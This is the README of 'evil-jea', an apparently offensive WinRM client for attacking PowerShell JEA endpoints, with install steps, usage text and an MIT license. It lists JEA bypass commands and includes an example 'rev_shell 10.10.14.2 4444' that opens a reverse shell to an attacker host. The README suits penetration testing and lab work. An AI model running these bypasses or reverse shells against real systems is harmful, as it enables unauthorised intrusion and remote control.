# Evil-JEA

A small WinRM client designed for interacting with JEA endpoints from Linux.

## Installation

From PyPi:
```
pip install evil-jea
```

From source:
```
git clone https://github.com/sashathomas/evil-jea
cd evil-jea
make install
make build
```

## Usage
```
Usage: evil-jea [OPTIONS] COMMAND [ARGS]...

  ___________     .__.__                 ____.___________   _____   
  \_   _____/__  _|__|  |               |    |\_   _____/  /  _  \  
   |    __)_\  \/ /  |  |    ______     |    | |    __)_  /  /_\  \ 
   |        \\   /|  |  |__ /_____/ /\__|    | |        \/    |    \
  /_______  / \_/ |__|____/         \________|/_______  /\____|__  /
          \/                                          \/         \/ 
                                                                                                                           
      

Options:
  -v, --verbose  Enable verbose output.
  --help         Show this message and exit.

Commands:
  connect  Connect to JEA target.
  run      Run a single command on the JEA target.
  shell    Attempts to run a reverse shell on the target using a call...
  version  Get the library version.
```
## JEA Shell
Once connected to a shell, evil-jea offers a couple custom commands to help find and exploit common JEA misconfigurations:

```
[10.10.10.210]: PS> help

JEA Shell Commands:
    help                    Show list of available commands
    info [command]          Dump definitions for available commands. 
    call [command]          JEA bypass: Attempts to run [command] using call operator 
    function [command]      JEA bypass: Attempts to run [command] inside of a custom function
    rev_shell [ip] [port]   JEA bypass: Attempts to run a PowerShell reverse shell using call operator
```

## Examples
Connect to JEA endpoint:
```
evil-jea connect username password 10.10.10.10
```

Run single command on JEA endpoint:
```
evil-jea run username password 10.10.10.10 "Get-Command"
```

Try to run a PowerShell reverse shell using a call operator bypass:
```
[10.10.10.210]: PS> rev_shell 10.10.14.2 4444
```

## License

Copyright (c) sashathomas

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
